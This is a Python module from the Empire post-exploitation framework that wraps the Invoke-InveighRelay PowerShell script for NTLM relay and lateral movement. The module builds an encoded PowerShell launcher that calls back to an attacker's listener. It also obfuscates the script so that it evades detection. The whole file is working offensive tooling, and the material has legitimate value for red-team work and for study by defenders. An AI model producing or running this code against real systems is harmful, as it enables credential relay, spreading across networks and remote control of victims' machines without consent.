from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy_']
        proxyCreds = params['ProxyCreds']
        command = params['Command']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()
        
        script = module_code
        
        if command == "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                
                # generate the PowerShell one-liner with all of the proper options set
                command = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                              obfuscate=obfuscate, obfuscationCommand=obfuscate_command, userAgent=user_agent, proxy=proxy,
                                                              proxyCreds=proxyCreds, bypasses=params['Bypasses'])
                # check if launcher errored out. If so return nothing
                if command == "":
                    return handle_error_message("[!] Error in launcher generation.")

        # set defaults for Empire
        script_end = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (command)
        
        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "useragent" and option.lower() != "proxy_" and option.lower() != "proxycreds" and option.lower() != "command":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        if "," in str(values):
                            quoted = '"' + str(values).replace(',', '","') + '"'
                            script_end += " -" + str(option) + " " + quoted
                        else:
                            script_end += " -" + str(option) + " \"" + str(values) + "\""
        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end,
                                          obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
